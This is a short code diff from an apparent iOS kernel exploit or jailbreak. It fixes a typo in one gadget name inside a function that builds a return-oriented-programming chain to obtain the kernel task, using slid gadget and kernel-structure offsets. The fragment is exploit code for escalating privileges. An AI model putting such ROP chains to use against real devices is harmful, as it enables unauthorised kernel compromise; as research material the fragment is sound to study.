@@ -77,7 +77,7 @@ void rop_get_kernel_task(addr_t **chain, task_t *task)
                      call                  = offsets.slid.gadget_blr_x20_load_x22_x19,      //  |
                      add                   = offsets.slid.gadget_add_x0_x0_x19_load_x20_x19,//  |
                      str                   = offsets.slid.gadget_str_x0_x19_load_x20_x19,   //  |
-                     ldr_x21               = offsets.slid.gadget_ldr_x0_x21_load_x24_19,    //  |
+                     ldr_x21               = offsets.slid.gadget_ldr_x0_x21_load_x24_x19,   //  |
                      mov                   = offsets.slid.frag_mov_x1_x20_blr_x19,          //  |
                      kernel_task           = offsets.slid.data_kernel_task,                 //  |
                      off_ipc_space         = offsets.unslid.off_task_itk_space,             //  |
